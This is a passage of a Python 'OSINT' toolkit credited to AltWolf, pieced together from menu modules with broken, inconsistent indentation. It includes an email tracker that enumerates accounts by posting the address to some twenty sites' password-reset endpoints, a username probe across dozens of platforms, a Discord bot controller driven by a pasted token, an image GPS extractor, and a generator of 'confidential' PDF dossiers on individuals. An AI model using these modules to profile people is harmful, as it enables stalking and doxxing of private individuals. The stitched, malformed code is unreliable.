                filename = input("\nFilename (default: phone_scan_results.json): ").strip()
                if not filename:
                    filename = "phone_scan_results.json"
                scanner.export_results(filename)
            
            elif choice == "5":
                filename = input("\nFilename (default: phone_scan_report.html): ").strip()
                if not filename:
                    filename = "phone_scan_report.html"
                scanner.export_html_report(filename)
            
            elif choice == "6":
                print("\nSUPPORTED PLATFORMS:")
                print("="*80)
                for platform, config in scanner.platforms.items():
                    print(f"  {config['icon']} {platform}")
                print(f"\nTotal: {len(scanner.platforms)} platforms")
                print("\nVERIFICATION TYPES:")
                print("  - [OK] Direct verification (WhatsApp, Telegram, Truecaller)")
                print("  - [!!] Deep Google search with result parsing")
                print("  - [--] Content analysis and pattern detection")
                print("  - Real-time checking and validation")
                print("  - Country-specific directories (UK, US, etc.)")
            
            elif choice == "7":
                scanner.show_supported_countries()
            
            elif choice == "0":
                print("\nGoodbye!")
                sys.exit(0)
            
            else:
                print("[!!] Invalid choice")
            
            input("\n[Press Enter to continue]")

    if __name__ == "__main__":
        try:
            
            try:
                from bs4 import BeautifulSoup
                print("[OK] BeautifulSoup4 detected - Enhanced parsing enabled")
            except ImportError:
                print("[!!] BeautifulSoup4 not found - Using basic parsing")
                print("[i] Install with: pip install beautifulsoup4")
                print()
            
            main()
        except KeyboardInterrupt:
            print("\n\n[!!] Program interrupted by user")
            sys.exit(0)







elif menu_choice == "13":
            os.system('cls' if os.name == 'nt' else 'clear')
            typn = """
      ...                        ...      
   .-*****-                    .-----:.   
   .********+.              .==-------.   
   .********+++-.        .:+++=-------.   
   .********++++++:.   .=+++++=-------:   
   .+++*****++++++++=-++++++++=----=++:   Email Tracker By AltWolf
   .+++++***++++++++++++++++++=-=+++++:        Version Free
   .+++++++==+++++++++++++++++-+++++++:   
   .+++++++= .:++++++++++++-. -+++++++:   
   .+++++++=    .-+++++++..   -+++++++:   
   .+++++++=       .=+:.      -+++++++:   
   .+++++++=                  -+++++++:   
   .+++++++=                  -+++++++:   
   .+++++++=                  -+++++++. 
            """
            print_violet_white_gradient(typn)
            def check_email_exists(email):
                sites = {
                    "Facebook": "https://www.facebook.com/recover/initiate",
                    "Twitter": "https://twitter.com/account/begin_password_reset",
                    "Instagram": "https://www.instagram.com/accounts/password/reset/",
                    "Snapchat": "https://accounts.snapchat.com/accounts/password/reset",
                    "Pinterest": "https://www.pinterest.com/reset/",
                    "TikTok": "https://www.tiktok.com/login/forgot-password",
                    "Reddit": "https://www.reddit.com/password",
                    "Tumblr": "https://www.tumblr.com/login/forgot",
                    "YouTube": "https://www.youtube.com/account_recovery",
                    "GitHub": "https://github.com/password_reset",
                    "LinkedIn": "https://www.linkedin.com/uas/request-password-reset",
                    "Discord": "https://discord.com/api/v9/auth/forgot",
                    "Spotify": "https://accounts.spotify.com/en/password-reset",
                    "Netflix": "https://www.netflix.com/password",
                    "Amazon": "https://www.amazon.com/ap/forgotpassword",
                    "Microsoft": "https://account.live.com/password/reset",
                    "Apple": "https://iforgot.apple.com/password/verify/appleid",
                    "Dropbox": "https://www.dropbox.com/forgot",
                    "Twitch": "https://www.twitch.tv/user/password_reset",
                    "Steam": "https://store.steampowered.com/login/forgotpassword"
                }

                results = {}
                print(f"Checking email: {email}")
                print("This may take a moment...\n")

                for site_name, reset_url in sites.items():
                    try:
                        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                        payload = {'email': email}
                        response = requests.post(reset_url, data=payload, timeout=5, headers=headers, allow_redirects=True)

                        response_text = response.text.lower()
                        
                        if any(keyword in response_text for keyword in ['sent', 'email', 'recovery', 'reset', 'check your email', 'verify']):
                            results[site_name] = "Account found"
                            print(f"[+] {site_name}: Account found")
                        else:
                            results[site_name] = "Not found"

                    except requests.RequestException:
                        results[site_name] = "Could not check"
                    except:
                        pass

                return results

            email_to_check = input("Enter email address to check: ")
            results = check_email_exists(email_to_check)

            print("\n" + "="*50)
            print("Results:\n")
            for site, result in results.items():
                if result == "Account found":
                    print(f"    {site}: {result}")

            print("="*50)

            input("\nPress enter to continue...")
            time.sleep(1)
            os.system("python Alt-tool-Free.py")




if menu_choice == "14":
            os.system('cls' if os.name == 'nt' else 'clear')
            bannerr = """
                                       
              :@@@@@@@@                
            *@@@@@@@@@@@@              
           @@@@@@@@@@@@@@@=            
          -@@@@@@@@@@@@@@@@            
          @@@@@@@@@@@@@@@@@.           
          +@@@@@@@@@@@@@@@@            ID Tracker by AltWolf
           @@@@@@@@@@@@@@@@                 Version Free
            @@@@@@@@@@@@@-             
              %@@@@@@@@-               
           %@-          %@-            
        .@@@@@@@@@@@@@@@@@@@@          
       @@@@@@@@@@@@@@@@@@@@@@@+        
      @@@@@@@@@@@@@@@@@@@@@@@@@@       
     @@@@@@@@@@@@@@@@@@@@@@@@@@@@      
    -@@@@@@@@@@@@@@@@@@@@@@@@@@@@      
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@*     
    .----------------------------  

            """
            print_violet_white_gradient(bannerr)
            def check_url(url):
                try:
                    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                    response = requests.head(url, headers=headers, timeout=5, allow_redirects=True)
                    return response.status_code == 200
                except:
                    return None

            def search_id(user_id):
                platforms = {
                    'Twitter/X': 'https://twitter.com/{}',
                    'Instagram': 'https://www.instagram.com/{}',
                    'Facebook': 'https://www.facebook.com/{}',
                    'GitHub': 'https://github.com/{}',
                    'Reddit': 'https://www.reddit.com/user/{}',
                    'Discord': 'https://discord.com/users/{}',
                    'YouTube': 'https://www.youtube.com/@{}',
                    'TikTok': 'https://www.tiktok.com/@{}',
                    'Telegram': 'https://t.me/{}',
                    'Twitch': 'https://www.twitch.tv/{}',
                    'LinkedIn': 'https://www.linkedin.com/in/{}',
                    'Snapchat': 'https://www.snapchat.com/add/{}',
                    'Pinterest': 'https://www.pinterest.com/{}',
                    'Tumblr': 'https://{}.tumblr.com',
                    'Medium': 'https://medium.com/@{}',
                    'Pastebin': 'https://pastebin.com/u/{}',
                    'Spotify': 'https://open.spotify.com/user/{}',
                    'SoundCloud': 'https://soundcloud.com/{}',
                    'Steam': 'https://steamcommunity.com/id/{}',
                    'Roblox': 'https://www.roblox.com/users/profile?username={}',
                    'DeviantArt': 'https://www.deviantart.com/{}',
                    'Behance': 'https://www.behance.net/{}',
                    'Dribbble': 'https://dribbble.com/{}',
                    'Vimeo': 'https://vimeo.com/{}',
                    'Flickr': 'https://www.flickr.com/people/{}',
                    'Keybase': 'https://keybase.io/{}',
                    'GitLab': 'https://gitlab.com/{}',
                    'Bitbucket': 'https://bitbucket.org/{}',
                    'About.me': 'https://about.me/{}',
                    'Linktree': 'https://linktr.ee/{}',
                    'Codecademy': 'https://www.codecademy.com/profiles/{}',
                    'HackerOne': 'https://hackerone.com/{}',
                    'WordPress': 'https://{}.wordpress.com',
                    'Blogger': 'https://{}.blogspot.com',
                    'Goodreads': 'https://www.goodreads.com/{}',
                    'Last.fm': 'https://www.last.fm/user/{}',
                    'Mixcloud': 'https://www.mixcloud.com/{}',
                    'Bandcamp': 'https://{}.bandcamp.com'
                }

                print(f"\nSearching for ID: {user_id}")
                print("This may take a moment...\n")

                results = {'found': [], 'not_found': [], 'unknown': []}

                for platform, url_template in platforms.items():
                    url = url_template.format(quote(user_id))
                    
                    print(f"Checking {platform}...", end='\r', flush=True)

                    status = check_url(url)
                    
                    if status:
                        print(f"[+] {platform:<20} -> {url}")
                        results['found'].append((platform, url))
                    elif status is False:
                        results['not_found'].append(platform)
                    else:
                        results['unknown'].append((platform, url))

                    time.sleep(0.2)

                print_summary(results, user_id)

            def print_summary(results, user_id):
                print(f"\n{'='*60}")
                print(f"SEARCH SUMMARY FOR: {user_id}")
                print(f"{'='*60}\n")

                print(f"Profiles found: {len(results['found'])}")
                for platform, url in results['found']:
                    print(f"  - {platform}: {url}")

                print(f"\nProfiles not found: {len(results['not_found'])}")
                
                if results['unknown']:
                    print(f"\nManual verification required: {len(results['unknown'])}")
                    for platform, url in results['unknown']:
                        print(f"  - {platform}: {url}")

                print(f"\n{'='*60}\n")

            def main():
                print("ID TRACKER - Multi-Platform Search\n")
                
                user_id = input("Enter ID or username to search: ").strip()
                
                if not user_id:
                    print("Error: Empty ID")
                    return
                
                try:
                    search_id(user_id)
                except KeyboardInterrupt:
                    print("\n\nSearch interrupted by user")
                except Exception as e:
                    print(f"\nError: {str(e)}")

                input("Press enter to continue...")
                time.sleep(1)
                os.system("python Alt-tool-Free.py")

            if __name__ == "__main__":
                main()




elif menu_choice == "15":
        os.system('cls' if os.name == 'nt' else 'clear')
        time.sleep(0.5)
        control = """
      +%%%%%%:                       +%%%%%%:      
     *%%%%%%%%:                     *%%%%%%%%=     
   .+%%%%%%%%%#::::::::::::::::::::-%%%%%%%%%#-    
  *%%%%#**%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.  +%%%%-  
 #%%%%%-  #%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.  =%%%%%+ 
-%%%-..**#-..*%%%%%%%%%%%%%%%%%%%%%*. -%%%%%%: -%%.
*%%%:  ++*-  +%%%%+--+%%%%%%#=+%%%%=   %%%%%*  .#%:
#%%%%%%-  #%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*.:#%%%%%%=
%%%%%%%*++%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#   -%%%%%%+                  Controler de bot discord By AltWolf
%%%%%%%%%%%%%%=.  :*%%%%%%%%%%%-   :%%%%%##%%%%%%%#       When the script starts (purple and green as shown below)
%%%%%%%%%%%%%=      +%%%%%%%%%.      #%%%%%%%%%%%%%                    please press the Enter key ONCE!
%%%%%%%%%%%%%-      +%%%%%%%%%       #%%%%%%%%%%%%%
%%%%%%%%%%%%%%-    +%%:     -%%.   .#%%%%%%%%%%%%%%
%%%%%%%%%%%%-:#%%%%#-        .=%%%%%+:*%%%%%%%%%%%%
%%%%%%%%%%%=                           *%%%%%%%%%%%
%%%%%%%%%%-                             #%%%%%%%%%#
-%%%%%%%%-                               +%%%%%%%#.
  :+##*-                                   =##*=.  
        """
        print_violet_white_gradient(control)
        time.sleep(5)
        os.system('cls' if os.name == 'nt' else 'clear')
        intents = discord.Intents.default()
        intents.messages = True

        async def main(token, server_id, channel_id):
            client = discord.Client(intents=intents)
            
            @client.event
            async def on_ready():
                print(f'{Fore.LIGHTMAGENTA_EX}Connected : {client.user}')
                server = client.get_guild(int(server_id))
                if server is None:
                    print("Impossible to contact the server.")
                    return
                channel = server.get_channel(int(channel_id))
                if channel is None:
                    print("Impossible to contact the canal")
                    return
                while True:
                    commande = input(f'{Fore.LIGHTMAGENTA_EX}Enter a sentence or a command :{Fore.LIGHTGREEN_EX}')
                    if commande.lower() == "exit":
                        break
                    await channel.send(commande)
                    print(f"Command send : {commande}")

            await client.start(token)

        if __name__ == "__main__":
            ban = input(f""" {Fore.MAGENTA} 
            
                                                                
                @:                              :@               
               @@-@:   {Fore.LIGHTGREEN_EX}Remote-Token-Bot-Dc{Fore.MAGENTA}  :@-@@           
               @@%#@.                      .@#%@@             
               +@@*:@@#                  #@@:*@@+               
               #@@@:@@@                @@@:@@@#                                                                              
                @@@@##@@#:          :#@@##@@@@                                                                  
                 @@@@@@@@@@:      :@@@@@@@@@@                                                                
                  .@@@@@@@@@-    -@@@@@@@@@.                                                                     
                     @@@@@@@|    |@@@@@@@.                                                
                      @@@@@@#    #@@@@@@                 {Fore.LIGHTGREEN_EX}##########################################{Fore.LIGHTMAGENTA_EX}
                       @@@@@@    @@@@@@                  {Fore.LIGHTGREEN_EX}##                                      ##{Fore.LIGHTMAGENTA_EX}
                       @@@@@@    @@@@@@                  {Fore.LIGHTGREEN_EX}##   {Fore.LIGHTMAGENTA_EX}Mettre le token du bot a remote{Fore.LIGHTGREEN_EX}    ##{Fore.LIGHTMAGENTA_EX}
                       @@@@@@:  :@@@@@@                  {Fore.LIGHTGREEN_EX}##                                      ##{Fore.LIGHTMAGENTA_EX}
                      :@@@@@@+  +@@@@@@:                 {Fore.LIGHTGREEN_EX}##########################################{Fore.LIGHTMAGENTA_EX}        
                      *@@@@@@|  %@@@@@@*                                   |||
                      @@@@@@@@  @@@@@@@@                                   |||
                      @@@@@@@@  @@@@@@@@                                   |||
                     +@@@@@@@@..@@@@@@@@+                                   |
                     @@@@@@@@@==@@@@@@@@@                                   v
                    +@@@@@@@@@##@@@@@@@@@+     
                                """)  
            letoken = input(f"{Fore.LIGHTGREEN_EX}Token {Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTGREEN_EX} ")
            server_id = input(f"{Fore.LIGHTGREEN_EX}ID du serveur {Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTGREEN_EX} ")
            channel_id = input(f"{Fore.LIGHTGREEN_EX}ID du canal {Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTGREEN_EX} ")
            
            asyncio.run(main(letoken, server_id, channel_id))




elif menu_choice == "16":
    os.system('cls' if os.name == 'nt' else 'clear')
    meta = """
  -%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*   
  #%%%%%%%%%%%%%%%%%#: .#%: .#%- .#%%%%:  
  #%%%%%%%%%%%%%%%%%%. .#%: .#%-  #%%%%:  
  #%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%:  
  #%:                                *%:  
  #%:                                *%:  
  #%:                ..              *%:  MetaData for image By AltWolf
  #%:                #*              *%:          Version V2.2.1
  #%:       .=*%%-  -%- #%#+:        *%:  
  #%:    +#%%*=.    ##    -*#%%*.    *%:  
  #%:   .#%%*-.    -%-     :+#%%-    *%:  
  #%:       =#%%%- *#   #%%#+:       *%:  
  #%:           -::%=   =            *%:  
  #%:             -=                 *%:  
  #%:                                *%:  
  #%.                                *%:  
  +%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.  
     ................................    
    """
    print_violet_white_gradient(meta)
    def get_exif_data(image_path):
        try:
            image = Image.open(image_path)
            exif_data = image._getexif()
            return exif_data
        except:
            return None

    def decode_gps_info(gps_info):
        gps_data = {}
        
        for key, value in gps_info.items():
            decoded_key = GPSTAGS.get(key, key)
            gps_data[decoded_key] = value
        
        return gps_data

    def convert_to_degrees(value):
        d = float(value[0])
        m = float(value[1])
        s = float(value[2])
        return d + (m / 60.0) + (s / 3600.0)

    def get_coordinates(gps_info):
        try:
            gps_latitude = gps_info.get('GPSLatitude')
            gps_latitude_ref = gps_info.get('GPSLatitudeRef')
            gps_longitude = gps_info.get('GPSLongitude')
            gps_longitude_ref = gps_info.get('GPSLongitudeRef')
            
            if gps_latitude and gps_latitude_ref and gps_longitude and gps_longitude_ref:
                lat = convert_to_degrees(gps_latitude)
                if gps_latitude_ref != 'N':
                    lat = -lat
                
                lon = convert_to_degrees(gps_longitude)
                if gps_longitude_ref != 'E':
                    lon = -lon
                
                return lat, lon
        except:
            return None, None
        
        return None, None

    def extract_metadata(image_path):
        exif_data = get_exif_data(image_path)
        
        if not exif_data:
            print("No metadata found in this image.")
            return
        
        metadata = {}
        gps_info = None
        
        for tag_id, value in exif_data.items():
            tag = TAGS.get(tag_id, tag_id)
            
            if tag == "GPSInfo":
                gps_info = decode_gps_info(value)
            else:
                metadata[tag] = value
        
        print(f"\nMetadata extracted from: {os.path.basename(image_path)}")
        print("="*60)
        
        if metadata:
            print("\nGeneral Information:")
            for key, value in metadata.items():
                if key not in ['MakerNote', 'UserComment']:
                    print(f"  {key}: {value}")
        
        if gps_info:
            print("\nGPS Information:")
            for key, value in gps_info.items():
                print(f"  {key}: {value}")
            
            lat, lon = get_coordinates(gps_info)
            if lat and lon:
                print(f"\nCoordinates:")
                print(f"  Latitude: {lat}")
                print(f"  Longitude: {lon}")
                print(f"  Google Maps: https://www.google.com/maps?q={lat},{lon}")
        
        file_stats = os.stat(image_path)
        print("\nFile Information:")
        print(f"  File Size: {file_stats.st_size} bytes")
        print(f"  Created: {time.ctime(file_stats.st_ctime)}")
        print(f"  Modified: {time.ctime(file_stats.st_mtime)}")
        
        print("="*60)

    def main():
        print("Photo Metadata Extractor\n")
        
        image_path = input("Enter path to image file: ").strip()
        
        if not os.path.exists(image_path):
            print("Error: File not found.")
        elif not image_path.lower().endswith(('.jpg', '.jpeg', '.png', '.tiff', '.bmp')):
            print("Error: Unsupported file format.")
        else:
            extract_metadata(image_path)
        
        input("\nPress enter to continue...")
        time.sleep(1)
        os.system("python Alt-tool-Free.py")

    if __name__ == "__main__":
        main()




if menu_choice == "17":
    os.system('cls' if os.name == 'nt' else 'clear')
    import os
    import sys
    from datetime import datetime
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_RIGHT, TA_JUSTIFY
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, PageBreak, Table, TableStyle, Image
    from reportlab.lib import colors
    from reportlab.pdfgen import canvas


    class InformationCollector:
        def __init__(self):
            self.data = {}
            self.entity_type = None
            
        def clear_screen(self):
            os.system('cls' if os.name == 'nt' else 'clear')
        
        def print_banner(self):
            bannerr = """
        -=++++++++++++++++++++++++=.            
      =*:                         .+*.          
     :*.                            .*+.        
     -*.                              .*+       
     -*.                                :*=     
     -*.                                  -*-   
     -*.               : +.                -*   
     -*.               - +.                :*.  
     -*.               .-+                 :*.  
     -*.                *:                 :*.  
     -*.               +=..                :*.  
     -*.              -+   : ....          :*.  
     -*.             :*=:    -.  :+        :*.  PDF generator By AltWolf
     -*.          ::-+                     :*.       Version V1.2.1
     -*.        -  +-                      :*.  
     -*.        :-:                        :*.  
     -*.                                   :*.  
     -*.                                   :*.  
     -*.                                   :*.  
     -*.         -#=#- #++*. #*+#          :*.  
     -*.         -* -* #. :# ##            :*.  
     -*.         -#-.  #. -* #-            :*.  
     -*.         -*    ##%=  #:            :*.  
     -*.                                   :*.  
     :*:                                   =*   
      -*=::::::::::::::::::::::::::::::::-++.   
        ..:::::::::::::::::::::::::::::::.  
            """
            print_violet_white_gradient(bannerr)
        
        def print_menu(self):
            print("\n[1] Individual Person")
            print("[2] Company/Organization")
            print("[3] Website/Online Platform")
            print("[4] Event/Incident")
            print("[5] Custom Report (Flexible)")
            print("\n[0] Exit")
            print("\n" + "="*60)
        
        def get_input(self, prompt, required=True, multiline=False):
            if multiline:
                print(f"\n{prompt}")
                print("(Press Enter twice to finish)")
                lines = []
                while True:
                    line = input()
                    if line == "":
                        if lines:
                            break
                        elif not required:
                            break
                    lines.append(line)
                return "\n".join(lines) if lines else ""
            else:
                while True:
                    value = input(f"\n{prompt}: ").strip()
                    if value or not required:
                        return value
                    print("[!] This field is required!")
        
        def collect_person_info(self):
            print("\n" + "="*60)
            print("           PERSON INFORMATION COLLECTION")
            print("="*60)
            
            self.data['entity_type'] = "Individual Person"
            
            print("\n--- BASIC INFORMATION ---")
            self.data['full_name'] = self.get_input("Full Name")
            self.data['date_of_birth'] = self.get_input("Date of Birth", required=False)
            self.data['age'] = self.get_input("Age", required=False)
            self.data['gender'] = self.get_input("Gender", required=False)
            self.data['nationality'] = self.get_input("Nationality", required=False)
            
            print("\n--- CONTACT INFORMATION ---")
            self.data['email'] = self.get_input("Email Address", required=False)
            self.data['phone'] = self.get_input("Phone Number", required=False)
            self.data['address'] = self.get_input("Physical Address", required=False, multiline=True)
            
            print("\n--- PROFESSIONAL INFORMATION ---")
            self.data['occupation'] = self.get_input("Occupation/Job Title", required=False)
            self.data['company'] = self.get_input("Company/Organization", required=False)
            self.data['industry'] = self.get_input("Industry", required=False)
            self.data['experience'] = self.get_input("Years of Experience", required=False)
            
            print("\n--- EDUCATION ---")
            self.data['education'] = self.get_input("Education Background", required=False, multiline=True)
            
            print("\n--- SOCIAL MEDIA & ONLINE PRESENCE ---")
            self.data['linkedin'] = self.get_input("LinkedIn Profile", required=False)
            self.data['twitter'] = self.get_input("Twitter/X Handle", required=False)
            self.data['facebook'] = self.get_input("Facebook Profile", required=False)
            self.data['instagram'] = self.get_input("Instagram Handle", required=False)
            self.data['website'] = self.get_input("Personal Website", required=False)
            
            print("\n--- ADDITIONAL INFORMATION ---")
            self.data['skills'] = self.get_input("Skills/Expertise", required=False, multiline=True)
            self.data['languages'] = self.get_input("Languages Spoken", required=False)
            self.data['interests'] = self.get_input("Interests/Hobbies", required=False, multiline=True)
            
            print("\n--- NOTES & OBSERVATIONS ---")
            self.data['notes'] = self.get_input("Additional Notes", required=False, multiline=True)
            self.data['source'] = self.get_input("Information Source", required=False)
            
        def collect_company_info(self):
            print("\n" + "="*60)
            print("         COMPANY/ORGANIZATION INFORMATION")
            print("="*60)
            
            self.data['entity_type'] = "Company/Organization"
            
            print("\n--- BASIC INFORMATION ---")
            self.data['company_name'] = self.get_input("Company Name")
            self.data['legal_name'] = self.get_input("Legal Name", required=False)
            self.data['founded'] = self.get_input("Founded Date", required=False)
            self.data['industry'] = self.get_input("Industry/Sector")
            self.data['company_type'] = self.get_input("Company Type (LLC, Corp, etc.)", required=False)
            
            print("\n--- LOCATION & CONTACT ---")
            self.data['headquarters'] = self.get_input("Headquarters Address", required=False)
            self.data['country'] = self.get_input("Country", required=False)
            self.data['phone'] = self.get_input("Phone Number", required=False)
            self.data['email'] = self.get_input("Email Address", required=False)
            self.data['website'] = self.get_input("Website URL", required=False)
            
            print("\n--- BUSINESS DETAILS ---")
            self.data['description'] = self.get_input("Business Description", required=False, multiline=True)
            self.data['products_services'] = self.get_input("Products/Services", required=False, multiline=True)
            self.data['employees'] = self.get_input("Number of Employees", required=False)
            self.data['revenue'] = self.get_input("Annual Revenue", required=False)
            self.data['funding'] = self.get_input("Funding Information", required=False)
            
            print("\n--- LEADERSHIP ---")
            self.data['ceo'] = self.get_input("CEO/Founder", required=False)
            self.data['executives'] = self.get_input("Key Executives", required=False, multiline=True)
            
            print("\n--- SOCIAL MEDIA & ONLINE PRESENCE ---")
            self.data['linkedin'] = self.get_input("LinkedIn Page", required=False)
            self.data['twitter'] = self.get_input("Twitter/X Handle", required=False)
            self.data['facebook'] = self.get_input("Facebook Page", required=False)
            self.data['instagram'] = self.get_input("Instagram Handle", required=False)
            
            print("\n--- REGISTRATION & LEGAL ---")
            self.data['registration_number'] = self.get_input("Registration Number", required=False)
            self.data['tax_id'] = self.get_input("Tax ID/EIN", required=False)
            self.data['legal_status'] = self.get_input("Legal Status", required=False)
            
            print("\n--- NOTES & OBSERVATIONS ---")
            self.data['notes'] = self.get_input("Additional Notes", required=False, multiline=True)
            self.data['source'] = self.get_input("Information Source", required=False)
        
        def collect_website_info(self):
            print("\n" + "="*60)
            print("          WEBSITE/PLATFORM INFORMATION")
            print("="*60)
            
            self.data['entity_type'] = "Website/Online Platform"
            
            print("\n--- BASIC INFORMATION ---")
            self.data['website_name'] = self.get_input("Website/Platform Name")
            self.data['url'] = self.get_input("URL/Domain")
            self.data['category'] = self.get_input("Category/Type", required=False)
            self.data['launch_date'] = self.get_input("Launch Date", required=False)
            
            print("\n--- OWNERSHIP & MANAGEMENT ---")
            self.data['owner'] = self.get_input("Owner/Creator", required=False)
            self.data['operator'] = self.get_input("Operator/Administrator", required=False)
            self.data['company'] = self.get_input("Operating Company", required=False)
            
            print("\n--- TECHNICAL DETAILS ---")
            self.data['hosting'] = self.get_input("Hosting Provider", required=False)
            self.data['ip_address'] = self.get_input("IP Address", required=False)
            self.data['technologies'] = self.get_input("Technologies Used", required=False, multiline=True)
            self.data['cms'] = self.get_input("CMS Platform", required=False)
            
            print("\n--- REGISTRATION & LEGAL ---")
            self.data['registrar'] = self.get_input("Domain Registrar", required=False)
            self.data['registration_date'] = self.get_input("Domain Registration Date", required=False)
            self.data['expiration_date'] = self.get_input("Domain Expiration Date", required=False)
            
            print("\n--- CONTENT & PURPOSE ---")
            self.data['description'] = self.get_input("Website Description", required=False, multiline=True)
            self.data['purpose'] = self.get_input("Purpose/Objectives", required=False, multiline=True)
            self.data['target_audience'] = self.get_input("Target Audience", required=False)
            
            print("\n--- CONTACT INFORMATION ---")
            self.data['contact_email'] = self.get_input("Contact Email", required=False)
            self.data['phone'] = self.get_input("Phone Number", required=False)
            self.data['physical_address'] = self.get_input("Physical Address", required=False)
            
            print("\n--- SOCIAL MEDIA & PRESENCE ---")
            self.data['social_media'] = self.get_input("Social Media Links", required=False, multiline=True)
            
            print("\n--- NOTES & OBSERVATIONS ---")
            self.data['notes'] = self.get_input("Additional Notes", required=False, multiline=True)
            self.data['source'] = self.get_input("Information Source", required=False)
        
        def collect_event_info(self):
            print("\n" + "="*60)
            print("            EVENT/INCIDENT INFORMATION")
            print("="*60)
            
            self.data['entity_type'] = "Event/Incident"
            
            print("\n--- BASIC INFORMATION ---")
            self.data['event_name'] = self.get_input("Event/Incident Name")
            self.data['event_type'] = self.get_input("Type of Event", required=False)
            self.data['date'] = self.get_input("Date of Event")
            self.data['time'] = self.get_input("Time", required=False)
            self.data['duration'] = self.get_input("Duration", required=False)
            
            print("\n--- LOCATION ---")
            self.data['location'] = self.get_input("Location/Venue", required=False)
            self.data['address'] = self.get_input("Full Address", required=False, multiline=True)
            self.data['city'] = self.get_input("City", required=False)
            self.data['country'] = self.get_input("Country", required=False)
            
            print("\n--- PARTIES INVOLVED ---")
            self.data['organizer'] = self.get_input("Organizer/Host", required=False)
            self.data['participants'] = self.get_input("Key Participants", required=False, multiline=True)
            self.data['attendees'] = self.get_input("Number of Attendees", required=False)
            
            print("\n--- EVENT DETAILS ---")
            self.data['description'] = self.get_input("Event Description", required=False, multiline=True)
            self.data['purpose'] = self.get_input("Purpose/Objectives", required=False, multiline=True)
            self.data['outcome'] = self.get_input("Outcome/Results", required=False, multiline=True)
            
            print("\n--- TIMELINE ---")
            self.data['timeline'] = self.get_input("Event Timeline", required=False, multiline=True)
            
            print("\n--- MEDIA & DOCUMENTATION ---")
            self.data['media_coverage'] = self.get_input("Media Coverage Links", required=False, multiline=True)
            self.data['documentation'] = self.get_input("Documentation/Reports", required=False, multiline=True)
            
            print("\n--- NOTES & OBSERVATIONS ---")
            self.data['notes'] = self.get_input("Additional Notes", required=False, multiline=True)
            self.data['source'] = self.get_input("Information Source", required=False)
        
        def collect_custom_info(self):
            print("\n" + "="*60)
            print("              CUSTOM REPORT CREATION")
            print("="*60)
            
            self.data['entity_type'] = "Custom Report"
            
            self.data['subject'] = self.get_input("Report Subject/Title")
            
            print("\nHow many sections do you want to add?")
            num_sections = int(self.get_input("Number of sections (1-20)", required=True))
            
            self.data['sections'] = []
            
            for i in range(num_sections):
                print(f"\n--- SECTION {i+1} ---")
                section = {}
                section['title'] = self.get_input(f"Section {i+1} Title")
                section['content'] = self.get_input(f"Section {i+1} Content", required=False, multiline=True)
                self.data['sections'].append(section)
            
            print("\n--- ADDITIONAL INFORMATION ---")
            self.data['notes'] = self.get_input("Additional Notes", required=False, multiline=True)
            self.data['source'] = self.get_input("Information Source", required=False)
        
        def generate_pdf(self):
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            
            if self.entity_type == '1':
                filename = f"person_report_{timestamp}.pdf"
                title = "Person Information Report"
            elif self.entity_type == '2':
                filename = f"company_report_{timestamp}.pdf"
                title = "Company Information Report"
            elif self.entity_type == '3':
                filename = f"website_report_{timestamp}.pdf"
                title = "Website Information Report"
            elif self.entity_type == '4':
                filename = f"event_report_{timestamp}.pdf"
                title = "Event Information Report"
            else:
                filename = f"custom_report_{timestamp}.pdf"
                title = "Custom Information Report"
            
            doc = SimpleDocTemplate(filename, pagesize=letter,
                                    rightMargin=72, leftMargin=72,
                                    topMargin=72, bottomMargin=18)
            
            story = []
            
            styles = getSampleStyleSheet()
            
            title_style = ParagraphStyle(
                'CustomTitle',
                parent=styles['Heading1'],
                fontSize=24,
                textColor=colors.HexColor('#1a1a1a'),
                spaceAfter=30,
                alignment=TA_CENTER,
                fontName='Helvetica-Bold'
            )
            
            heading_style = ParagraphStyle(
                'CustomHeading',
                parent=styles['Heading2'],
                fontSize=14,
                textColor=colors.HexColor('#2c3e50'),
                spaceAfter=12,
                spaceBefore=12,
                fontName='Helvetica-Bold'
            )
            
            body_style = ParagraphStyle(
                'CustomBody',
                parent=styles['Normal'],
                fontSize=11,
                textColor=colors.HexColor('#333333'),
                spaceAfter=12,
                alignment=TA_JUSTIFY,
                fontName='Helvetica'
            )
            
            label_style = ParagraphStyle(
                'Label',
                parent=styles['Normal'],
                fontSize=10,
                textColor=colors.HexColor('#666666'),
                fontName='Helvetica-Bold'
            )
            
            story.append(Paragraph(title, title_style))
            story.append(Spacer(1, 12))
            
            generation_date = datetime.now().strftime('%B %d, %Y at %H:%M:%S')
            story.append(Paragraph(f"<i>Generated on: {generation_date}</i>", body_style))
            story.append(Spacer(1, 20))
            
            story.append(Paragraph("<u>CONFIDENTIAL INFORMATION REPORT</u>", heading_style))
            story.append(Spacer(1, 12))
            
            if self.entity_type == '5':
                story.append(Paragraph(f"<b>Subject:</b> {self.data.get('subject', 'N/A')}", body_style))
                story.append(Spacer(1, 20))
                
                for i, section in enumerate(self.data.get('sections', []), 1):
                    story.append(Paragraph(f"{i}. {section['title']}", heading_style))
                    if section['content']:
                        content_lines = section['content'].split('\n')
                        for line in content_lines:
                            if line.strip():
                                story.append(Paragraph(line, body_style))
                    else:
                        story.append(Paragraph("No content provided.", body_style))
                    story.append(Spacer(1, 12))
            else:
                for key, value in self.data.items():
                    if key in ['entity_type', 'sections']:
                        continue
                    
                    if value:
                        label = key.replace('_', ' ').title()
                        
                        story.append(Paragraph(f"<b>{label}:</b>", label_style))
                        
                        value_lines = str(value).split('\n')
                        for line in value_lines:
                            if line.strip():
                                story.append(Paragraph(line, body_style))
                        
